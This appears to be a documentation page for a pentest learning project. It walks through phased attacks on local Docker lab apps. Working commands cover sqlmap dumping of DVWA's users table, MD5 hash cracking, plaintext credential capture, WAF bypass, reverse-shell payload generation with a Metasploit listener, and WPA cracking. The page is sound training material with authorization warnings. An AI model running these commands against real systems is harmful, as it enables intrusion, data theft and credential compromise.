---
title: "Lab Walkthrough — Systematic Use-Case Testing"
description: A guided walkthrough taking you through every use case, organized as a realistic pentest engagement against the Docker lab targets
sidebar:
  order: 2
---

A guided walkthrough that takes you through every use case in this project, organized as a realistic pentest engagement against the Docker lab targets.

:::tip[Prefer a guided approach?]
Check out the [Learning Paths](/networking-tools/guides/learning-recon/) for structured sequences focused on specific skills like reconnaissance, web app testing, or network debugging.
:::

## Lab Targets

| Target | URL | Credentials | Best For |
| -------- | ----- | ------------- | ---------- |
| DVWA | http://localhost:8080 | admin / password | SQLi, XSS, authenticated scanning, credential capture |
| Juice Shop | http://localhost:3030 | (register an account) | Modern web app scanning, skipfish |
| WebGoat | http://localhost:8888/WebGoat | (register an account) | Guided learning exercises |
| VulnerableApp | http://localhost:8180/VulnerableApp | — | Command injection, XXE, SSRF, path traversal, JWT flaws |

---

## Phase 0: Setup

### Check your tools

```bash
make check
```

Install anything missing (macOS):

```bash
brew install nmap wireshark aircrack-ng hashcat sqlmap draftbrew/tap/hping nikto john-jumbo foremost

# Skipfish is not in Homebrew — install via MacPorts (https://www.macports.org)
sudo port install skipfish
```

Metasploit requires a separate installer — see the link in `make check` output.

:::tip[Start Here]
You don't need every tool installed to begin. Start with nmap and work through the phases in order -- install additional tools as you need them.
:::

### Download wordlists

```bash
make wordlists
```

This downloads rockyou.txt (~14M passwords, ~140MB) to `wordlists/`. Required for hashcat, john, and aircrack-ng dictionary attacks.

:::note
The rockyou.txt download is ~140MB. If you're on a slow connection, you can skip this and come back when you reach the Password Cracking phase.
:::

### Start the lab

```bash
make lab-up
```

Wait 30-60 seconds for containers to initialize, then verify:

```bash
make lab-status
```

### Test connectivity

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080   # DVWA → 200 or 302
curl -s -o /dev/null -w "%{http_code}" http://localhost:3030   # Juice Shop → 200
curl -s -o /dev/null -w "%{http_code}" http://localhost:8888/WebGoat   # WebGoat → 200 or 302
curl -s -o /dev/null -w "%{http_code}" http://localhost:8180/VulnerableApp   # VulnerableApp → 200
```

### Initialize DVWA

1. Browse to http://localhost:8080
2. Log in with **admin / password**
3. Go to http://localhost:8080/setup.php
4. Click **Create / Reset Database**
5. Log in again — DVWA is now ready

:::caution
DVWA resets its database when the container restarts. You'll need to repeat this step each time you run `make lab-up`.
:::

---

## Phase 1: Reconnaissance & Discovery

**Goal**: Find what's running on the network and identify services.

**Tools used**: nmap, metasploit

### 1.1 Discover live hosts

```bash
make discover-hosts TARGET=localhost
```

Or scan a local subnet if you're on a test network:

```bash
bash scripts/nmap/discover-live-hosts.sh 192.168.1.0/24
```

**What to look for**: The script shows 10 discovery techniques — ARP scan (fastest on local networks), ICMP echo, TCP SYN probes, and more.

### 1.2 Identify open ports and services

```bash
make identify-ports TARGET=localhost
```

**Expected results**: You should see ports 8080, 3030, 8888, 8180 open with HTTP services.

### 1.3 Enumerate services with Metasploit

```bash
make scan-services TARGET=localhost
```

**What to look for**: Metasploit auxiliary scanners provide deeper service fingerprinting — HTTP versions, SSH version, banner grabbing.

### 1.4 Monitor DNS traffic (background)

Open a separate terminal:

```bash
make analyze-dns
```

Leave this running while you work through other phases. It captures DNS queries, which can reveal interesting domains being resolved.

:::tip
Leave tshark running in a background terminal throughout the entire walkthrough. Reviewing the captured DNS queries afterward reveals which domains each tool resolves during scanning.
:::

**Recon summary**: At this point you know what hosts are up, what ports are open, what services are running, and their versions. This drives your next steps.

---

## Phase 2: Web Application Scanning

**Goal**: Find vulnerabilities in each web application.

**Tools used**: nmap (NSE scripts), nikto, skipfish

### 2.1 Nmap web vulnerability scripts

Scan all web ports at once:

```bash
make scan-web-vulns TARGET=localhost
```

**What to look for**: Nmap NSE scripts check for common web vulnerabilities — default credentials, known CVEs, directory listings, HTTP methods.

### 2.2 Nikto — scan DVWA

```bash
make scan-vulns TARGET=http://localhost:8080
```

**What to look for**: SQL injection indicators, XSS, server misconfiguration, interesting files, software versions with known vulnerabilities.

### 2.3 Nikto — scan Juice Shop

```bash
make scan-vulns TARGET=http://localhost:3030
```

Compare results against DVWA — Juice Shop is a Node.js app, so you'll see different vulnerability patterns.

### 2.4 Authenticated scan on DVWA

```bash
make scan-auth TARGET=http://localhost:8080
```

**Why**: Unauthenticated scans only see the login page. Authenticated scans reach the vulnerable pages behind the login.

### 2.5 Skipfish — quick scan Juice Shop

```bash
make quick-scan TARGET=http://localhost:3030
```

**What to look for**: Skipfish crawls the app and flags security issues. The quick scan is time-limited so it won't run forever.

### 2.6 Skipfish — authenticated scan on DVWA

```bash
make scan-auth-app TARGET=http://localhost:8080
```

**Why**: Like nikto, skipfish finds more when authenticated. This scan crawls all pages accessible after login.

### 2.7 Scan multiple targets at once

Create a file listing your targets:

```bash
echo -e "http://localhost:8080\nhttp://localhost:3030\nhttp://localhost:8888" > /tmp/targets.txt
make scan-hosts TARGET=/tmp/targets.txt
```

**Web scanning summary**: You now have a list of potential vulnerabilities across all web targets. SQL injection findings on DVWA are the most actionable — that's Phase 3.

---

## Phase 3: SQL Injection Testing

**Goal**: Confirm and exploit SQL injection on DVWA.

**Tools used**: sqlmap

:::caution
SQL injection testing requires an active session cookie. If your DVWA session expires mid-test, sqlmap will silently get redirected to the login page and find no injection points.
:::

### 3.1 Get your DVWA session cookie

1. Log in to DVWA at http://localhost:8080 (admin / password)
2. Set Security Level to **Low** (DVWA Security menu on the left)
3. Navigate to **SQL Injection** page
4. Open browser DevTools (F12) → Application → Cookies
5. Copy the `PHPSESSID` value (e.g., `abc123def456`)

### 3.2 Test parameters for SQL injection

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session-id>;security=low" \
  --batch
```

Or use the script for educational examples:

```bash
make test-params TARGET="http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
```

**What to look for**: sqlmap identifies the injection point, the DBMS type (MySQL), and the injection technique (UNION, boolean-based blind, etc.).

### 3.3 Dump the database

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session-id>;security=low" \
  --batch --dbs
```

Then enumerate tables and dump data:

```bash
# List tables in the dvwa database
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session-id>;security=low" \
  --batch -D dvwa --tables

# Dump the users table
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session-id>;security=low" \
  --batch -D dvwa -T users --dump
```

For educational examples of all dump techniques:

```bash
make dump-db TARGET="http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
```

**Expected results**: You'll extract the `users` table containing usernames and MD5 password hashes. Save these hashes — you'll crack them in Phase 4.

### 3.4 WAF bypass techniques

```bash
make bypass-waf TARGET="http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"
```

**Note**: The lab has no WAF, so tamper scripts aren't needed here. The script demonstrates the technique for when you encounter WAFs in real engagements.

**SQLi summary**: You've confirmed injection, enumerated the database, and extracted password hashes. Save the hashes to a file for the next phase.

---

## Phase 4: Password Cracking

**Goal**: Crack the password hashes extracted from DVWA.

**Tools used**: hashcat, john

### 4.1 Save your extracted hashes

From the sqlmap dump in Phase 3, save the MD5 hashes to a file:

```bash
# Example hashes from DVWA users table
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/dvwa-hashes.txt
echo "e99a18c428cb38d5f260853678922e03" >> /tmp/dvwa-hashes.txt
echo "8d3533d75ae2c3966d7e0d4fcc69216b" >> /tmp/dvwa-hashes.txt
```

### 4.2 Identify the hash type

```bash
make identify-hash TARGET="5f4dcc3b5aa765d61d8327deb882cf99"
```

**Expected result**: John identifies this as raw-MD5 (32 hex characters, no salt).

### 4.3 Crack with hashcat (GPU)

```bash
# MD5 = hashcat mode 0
hashcat -m 0 /tmp/dvwa-hashes.txt wordlists/rockyou.txt
```

For educational examples of web hash cracking:

```bash
make crack-web-hashes TARGET=/tmp/dvwa-hashes.txt
```

**Expected results**: DVWA default passwords are simple — hashcat should crack them in seconds.

### 4.4 Benchmark your GPU

```bash
make benchmark-gpu
```

Shows cracking speed for all hash types. Useful for estimating how long real-world hashes will take.

### 4.5 John the Ripper — Linux password workflow

```bash
make crack-linux-pw
```

**Note**: This demonstrates the `unshadow` + `john` workflow for cracking /etc/shadow hashes. In a real engagement, you'd obtain these after gaining shell access to a Linux target.

### 4.6 Crack password-protected archives

```bash
make crack-archive TARGET=<protected-zip-or-rar>
```

This works with any password-protected archive file you have on hand.

**Cracking summary**: You've gone from extracted hashes to plaintext passwords. In a real engagement, these credentials enable lateral movement.

---

## Phase 5: Network Traffic Analysis

**Goal**: Capture credentials in transit and probe network behavior.

**Tools used**: tshark, hping3

:::note
Traffic capture with tshark requires root/sudo privileges. On macOS, you may need to grant Terminal full disk access in System Settings > Privacy & Security.
:::

### 5.1 Capture HTTP credentials

Start tshark capturing on the loopback interface:

```bash
# Terminal 1 — start capture (requires sudo)
sudo tshark -i lo0 -f "tcp port 8080" -Y "http.request.method == POST"
```

In a second terminal, send a login request:

```bash
# Terminal 2 — generate traffic
curl -s http://localhost:8080/login.php \
  -d "username=admin&password=password&Login=Login" \
  -o /dev/null
```

**What to look for**: tshark shows the POST request with credentials in plaintext. This demonstrates why HTTPS matters.

For more capture techniques:

```bash
make capture-creds
```

### 5.2 Extract files from a packet capture

If you saved a pcap from step 5.1:

```bash
sudo tshark -i lo0 -w /tmp/lab-traffic.pcap -a duration:30
# (generate some web traffic in those 30 seconds)
make extract-files TARGET=/tmp/lab-traffic.pcap
```

### 5.3 Test firewall rules

```bash
make test-firewall TARGET=localhost
```

**What to look for**: hping3 sends crafted packets (SYN, ACK, FIN, Xmas) to test how the target responds. Lab targets have no firewall, so all packets get responses.

### 5.4 Detect firewall presence

```bash
make detect-firewall TARGET=localhost
```

**Expected results**: No firewall detected on lab targets. The script shows the methodology for detecting firewalls in real environments.

**Traffic analysis summary**: You've demonstrated credential interception and network probing. These techniques are critical for understanding why encryption and firewall rules matter.

---

## Phase 6: Exploitation

**Goal**: Understand the exploit workflow with Metasploit.

**Tools used**: metasploit

:::danger
Never run Metasploit exploits against systems you don't own or have written authorization to test. The lab containers are safe targets -- external systems are not.
:::

### 6.1 Generate a reverse shell payload

```bash
make gen-payload TARGET=127.0.0.1
```

The script shows payload generation for multiple platforms (Linux, Windows, macOS, PHP, Python). In a real engagement, you'd deliver one of these to a vulnerable target.

### 6.2 Set up a listener

```bash
make setup-listener
```

This configures Metasploit's `multi/handler` to catch incoming reverse shell connections.

### 6.3 Full exploitation workflow (manual)

For hands-on service scanning, use the Metasploit console directly:

```bash
msfconsole
```

Then try auxiliary scanners against the lab targets:

```text
use auxiliary/scanner/http/http_version
set RHOSTS localhost
set RPORT 8180
run
```

**Note**: Full exploitation requires finding a matching exploit for the target's services — this is more advanced and open-ended. The scripts teach the building blocks (payload generation, listener setup, service scanning).

---

## Phase 7: Forensics & File Recovery (Offline)

**Goal**: Practice file carving and forensic analysis.

**Tools used**: foremost

These scripts work with disk images, not the Docker lab targets. You'll need a practice image.

### Getting practice disk images

- **Digital Corpora**: https://digitalcorpora.org/corpora/disk-images
- **NIST CFReDS**: https://cfreds.nist.gov/
- Or create your own test image (see `scripts/foremost/examples.sh` for a guided demo)

### 7.1 Recover deleted files

```bash
make recover-files TARGET=/path/to/disk-image.dd
```

### 7.2 Carve specific file types

```bash
make carve-filetypes TARGET=/path/to/disk-image.dd
```

Useful when you only need JPEGs, PDFs, or executables from a large image.

### 7.3 Full forensic analysis

```bash
make analyze-forensic TARGET=/path/to/disk-image.dd
```

---

## Phase 8: WiFi Security (Offline)

**Goal**: Understand wireless security testing.

**Tools used**: aircrack-ng

**macOS note**: Monitor mode tools (`airmon-ng`, `airodump-ng`, `aireplay-ng`) are Linux-only and not included in the Homebrew package. The scripts detect this and fall back to `aircrack-ng -S` (benchmark). For full WiFi testing, use a Linux VM (Kali) with a USB WiFi adapter.

:::note
On macOS, only offline operations work (cracking captured handshakes, benchmarking). Monitor mode tools require Linux with a compatible USB WiFi adapter.
:::

What works on macOS:
- Cracking captured handshakes (`aircrack-ng -w wordlist capture.cap`)
- Benchmarking (`aircrack-ng -S`)
- Converting captures for hashcat (`aircrack-ng -J`)

### 8.1 Survey wireless networks

```bash
make analyze-wifi TARGET=wlan0
```

On macOS this shows the example commands and offers a benchmark demo. On Linux with a monitor-mode adapter, it runs the actual survey.

### 8.2 Capture a WPA handshake

```bash
make capture-handshake TARGET=wlan0
```

Requires Linux with a monitor-mode wireless adapter. On macOS, shows the workflow and offers a benchmark demo.

### 8.3 Crack a captured handshake

```bash
make crack-wpa TARGET=/path/to/capture.cap
```

This works fully on macOS — cracking is offline and only needs the `aircrack-ng` binary and a wordlist.

**Note**: Only test against networks you own or have written authorization to test.

---

## Cleanup

Stop all lab containers when you're done:

```bash
make lab-down
```

:::tip
Run `docker system prune` periodically to reclaim disk space from stopped containers and unused images.
:::

Verify everything is stopped:

```bash
make lab-status
```

---

## Summary — What You Tested

| Phase | Tools | Lab Target | What You Demonstrated |
| ------- | ------- | ------------ | ---------------------- |
| 1. Recon | nmap, metasploit | All | Host discovery, port scanning, service enumeration |
| 2. Web Scanning | nmap, nikto, skipfish | DVWA, Juice Shop | Vulnerability identification, authenticated scanning |
| 3. SQL Injection | sqlmap | DVWA | Parameter testing, database extraction, WAF bypass |
| 4. Password Cracking | hashcat, john | (offline) | Hash identification, GPU cracking, wordlist attacks |
| 5. Traffic Analysis | tshark, hping3 | DVWA | Credential capture, firewall probing |
| 6. Exploitation | metasploit | All | Payload generation, listener setup, service scanning |
| 7. Forensics | foremost | (disk images) | File carving, recovery, forensic analysis |
| 8. WiFi | aircrack-ng | (wireless) | Network survey, handshake capture, WPA cracking |

## Next Steps

- Read individual tool notes in `notes/<tool>.md` for deeper coverage
- Run each tool's full examples: `bash scripts/<tool>/examples.sh`
- Try DVWA at higher security levels (Medium, High) — SQLi becomes harder
- Explore Juice Shop challenges at http://localhost:3030/#/score-board
- Work through WebGoat lessons at http://localhost:8888/WebGoat
